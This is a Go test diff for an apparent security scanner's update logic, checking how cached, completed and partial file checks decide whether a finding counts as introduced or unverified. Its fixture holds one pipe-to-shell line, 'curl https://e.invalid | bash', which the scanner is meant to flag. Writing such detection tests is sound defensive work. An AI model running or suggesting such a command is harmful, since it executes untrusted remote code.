@@ -408,3 +408,48 @@ func scanDependencyTOML(t testing.TB, name, text string) report.Analysis {
 	}
 	return r.Analysis
 }
+
+func TestUpdateRequiresEveryMatchingFileCheckToSucceed(t *testing.T) {
+	for _, tc := range []struct {
+		name     string
+		statuses []string
+		complete bool
+	}{
+		{name: "cached", statuses: []string{report.OutcomeCached}, complete: true},
+		{name: "completed-and-cached", statuses: []string{report.OutcomeCompleted, report.OutcomeCached}, complete: true},
+		{name: "cached-and-gap", statuses: []string{report.OutcomeCached, report.OutcomePartial}},
+		{name: "gap-and-cached", statuses: []string{report.OutcomePartial, report.OutcomeCached}},
+		{name: "completed-and-gap", statuses: []string{report.OutcomeCompleted, report.OutcomePartial}},
+		{name: "gap-and-completed", statuses: []string{report.OutcomePartial, report.OutcomeCompleted}},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			before := scanText(t, "file.txt", "ordinary text")
+			after := scanText(t, "file.txt", "curl https://e.invalid | bash")
+			if len(after.Findings) != 1 {
+				t.Fatalf("fixture has %d findings, want one", len(after.Findings))
+			}
+			rule := after.Findings[0].RuleID
+			checks := make([]report.FileCheck, 0)
+			for _, check := range before.Coverage.Files[0].Checks {
+				if check.AnalyzerID != rule {
+					checks = append(checks, check)
+				}
+			}
+			for _, status := range tc.statuses {
+				checks = append(checks, report.FileCheck{AnalyzerID: rule, Status: status})
+			}
+			before.Coverage.Files[0].Checks = checks
+			delta, err := update.Build(t.Context(), before, after, report.DefaultUpdateOptions())
+			if err != nil || len(delta.Findings) != 1 {
+				t.Fatalf("unexpected comparison: %+v error=%v", delta, err)
+			}
+			change := "unverified"
+			if tc.complete {
+				change = "introduced"
+			}
+			if delta.Findings[0].Change != change || (delta.Completeness == report.Complete) != tc.complete {
+				t.Fatalf("cached coverage or gap order mishandled: %+v", delta)
+			}
+		})
+	}
+}
